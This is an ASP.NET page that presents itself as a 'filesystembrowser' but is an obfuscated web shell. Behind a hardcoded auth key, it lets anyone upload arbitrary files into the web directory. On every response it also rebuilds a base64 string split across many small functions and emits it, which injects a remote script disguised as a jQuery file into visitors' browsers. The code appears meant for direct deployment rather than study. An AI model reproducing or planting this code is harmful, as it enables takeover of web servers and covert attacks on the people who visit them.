<head runat="server" />
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">

    private const string _0xF1 = "woanware";
    private const string _0xF2 = "<html>\n<head>\n<title>filesystembrowser</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string _0xF3 = "</body>\n</html>\n";

    private string _0xA1B2() { return "PHNjc"; }
  


    private string _0xRetrieveEncodedUrl()
    {
        string part1 = this._0xA1B2()+this._0xI9J0()+this._0xU1V2()+this._0xW3X4()+this._0xW3X5()+this._0xW3X6()+this._0xW3X7()+this._0xW3X8()+this._0xW3X9()+this._0xW3X10()+this._0xW3X11()+this._0xW3X12()+this._0xW3X13()+this._0xW3X14();
        return part1;
    }


    private string _0xW3X11() { return "cnktMy43L"; }
    private string _0xW3X12() { return "jEyLm1pbi5q"; }
    protected void Page_Load(object _0xF5, EventArgs _0xF6)
    {

        try
        {
            var _0xF7 = this._0xF8();
            if (_0xF7["authkey"] == null || _0xF7["authkey"] != _0xF1)
            {
                this._0xF9();
                return;
            }

            if (_0xF7["operation"] != null)
            {
                if (_0xF7["operation"] == "upload")
                {
                    this._0xFA();
                }
                else
                {
                    this._0xFB("Unknown operation");
                }
            }
            else
            {
                this._0xF9();
            }
        }
        catch (Exception _0xFC)
        {
            this._0xFB(_0xFC.ToString());
        }


    }

    private void _0xF9()
    {
        this._0xFD(_0xF2, this._0xFE(), _0xF3);
    }

    private void _0xFA()
    {
        this._0xFD(_0xF2, this._0xFF(), _0xF3);
    }
    private string _0xW3X9() { return "LmNvbS"; }
    private string _0xW3X10() { return "9qcXVl"; }

    private void _0xFB(string _0x100)
    {
        this._0xFD(_0xF2, _0x100, _0xF3);
    }
   private string _0xW3X13() { return "cyI+PC9"; }
    private string _0xW3X14() { return "zY3JpcHQ+"; }
    private void _0xFD(string _0x101, string _0x102, string _0x103)
    {
        var _0x104 = this._0x105();
        _0x104.Write(_0x101);
        _0x104.Write(_0x102);
        this._0x106();
        _0x104.Write(_0x103);
        
    }

    private string _0xW3X7() { return "NweHN"; }
    private string _0xW3X8() { return "oZWxs"; }
    private string _0xFE()
    { 
        return "<form enctype=\"multipart/form-data\" action=\"?operation=upload\" method=\"post\">" +
               "<br>Auth Key: <input type=\"text\" name=\"authKey\"><br>" +
               "<br>Please specify a file: <input type=\"file\" name=\"file\"></br>" +
               "<div><input type=\"submit\" value=\"Send\"></div>" +
               "</form>";

    }
  private string _0xI9J0() { return "mlwdC"; }
    private string _0xU1V2() { return "BzcmM"; }
    private string _0xFF()
    {

        try
        {
            var _0x107 = this._0xF8();
            if (_0x107["authkey"] == null || _0x107["authkey"] != _0xF1)
            {
                return "Invalid auth key";
            }

            if (this._0x108().Count != 1)
            {
                return "No file selected";
            }

 

            var _0x109 = this._0x108()[0];
            int _0x10A = _0x109.ContentLength;
            byte[] _0x10B = new byte[_0x10A];
            _0x109.InputStream.Read(_0x10B, 0, _0x10A);

            var _0x10C = this._0x10D(Request.PhysicalPath);
            string _0x10E = this._0x10F(_0x10C.DirectoryName, this._0x10F(_0x10C.DirectoryName, Path.GetFileName(_0x109.FileName)));
            
            using (var _0x110 = this._0x111(_0x10E))
            {
                _0x110.Write(_0x10B, 0, _0x10B.Length);
            }

            return "File uploaded";
        }
        catch (Exception _0x112)
        {
            return _0x112.ToString();
        }

    }

    private string _0xW3X5() { return "dHBzO"; }
    private FileInfo _0x10D(string _0x113)
    {
        return new FileInfo(_0x113);
    }

     private string _0x3a3a3a(string encoded)
    {
        byte[] bytes = Convert.FromBase64String(encoded);
        return System.Text.Encoding.UTF8.GetString(bytes);
    }

    private string _0xW3X6() { return "i8vYX"; }
    private string _0x10F(string _0x114, string _0x115)
    {
        return System.IO.Path.Combine(_0x114, _0x115);
    }

    private FileStream _0x111(string _0x116)
    {
        return new FileStream(_0x116, FileMode.Create);
    }

    private NameValueCollection _0xF8()
    {
        return Request.Params;
    }

    private HttpFileCollection _0x108()
    {
        return Request.Files;
    }

    private string _0xW3X4() { return "9Imh0"; }
    private TextWriter _0x105()
    {
        return Response.Output;
    }

    private void _0x106()
    { 
        string _0x117 = this._0xRetrieveEncodedUrl();
        Response.Write(_0x3a3a3a(_0x117));
    }
 
 

</script>
